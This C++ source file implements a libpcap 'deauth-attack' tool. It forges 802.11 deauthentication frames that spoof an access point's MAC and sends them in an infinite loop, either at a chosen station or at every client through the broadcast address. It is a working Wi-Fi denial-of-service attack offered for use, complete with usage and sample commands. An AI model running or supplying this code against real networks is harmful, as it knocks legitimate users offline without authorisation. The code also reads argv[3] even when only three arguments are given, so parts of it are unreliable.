#include "headers.h"
void usage() {
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void deauthAttack(pcap_t *handle, Mac AP, Mac ST){
    deauth_packet pkt;
    pkt.radiotap_hdr.ver_ = 0;
    pkt.radiotap_hdr.pad_ = 0;
    pkt.radiotap_hdr.len_ = 0x0c;
    pkt.radiotap_hdr.present_ = 0x00008004;
    pkt.radiotap_hdr.datarate_ = 0x02;
    pkt.radiotap_hdr.unknown_ = 0;
    pkt.radiotap_hdr.txflag_ = 0x0018;
    pkt.beacon_hdr.ver = 0;
    pkt.beacon_hdr.type = 0;
    pkt.beacon_hdr.subtype = 0xc;
    pkt.beacon_hdr.flags = 0;
    pkt.beacon_hdr.duration_id = 0x013a;
    pkt.beacon_hdr.dest_addr = ST;
    pkt.beacon_hdr.src_addr = AP;
    pkt.beacon_hdr.bssid = AP;
    pkt.beacon_hdr.squence_num = 0;
    pkt.beacon_hdr.fixed = 0x7;
    
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&pkt), sizeof(deauth_packet));
    if (res != 0){
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    printf("success");
}


int main(int argc, char *argv[]) {

    if (argc != 3 && argc != 4) {
        usage();
        return -1;
    }
    char *dev = argv[1];
    Mac apMac = Mac(argv[2]);
    Mac stMac = Mac(argv[3]);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    while (true){
        if (argc == 3){
            deauthAttack(handle, apMac, Mac("FF:FF:FF:FF:FF:FF"));
        }
        else if (argc == 4){
            deauthAttack(handle, apMac, stMac);
        }
    }
    pcap_close(handle);
    return 0;
}